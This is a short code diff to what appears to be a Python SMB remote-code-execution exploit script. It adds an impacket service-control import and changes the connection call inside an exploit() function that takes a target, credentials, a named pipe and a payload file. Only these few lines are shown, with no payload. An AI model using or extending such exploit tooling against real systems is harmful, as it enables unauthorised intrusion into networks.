@@ -1,4 +1,5 @@
 from mysmb import MYSMB, RemoteShell, SMBServer
+from impacket.dcerpc.v5 import scmr
 from struct import pack, unpack, unpack_from
 import sys
 import socket
@@ -1200,7 +1201,7 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
 
 
 def exploit(target, port, username, password, pipe_name, share, mode, payload_file):
-    conn = MYSMB(target, port)
+    conn = MYSMB(target)
 
     # set NODELAY to make exploit much faster
     conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
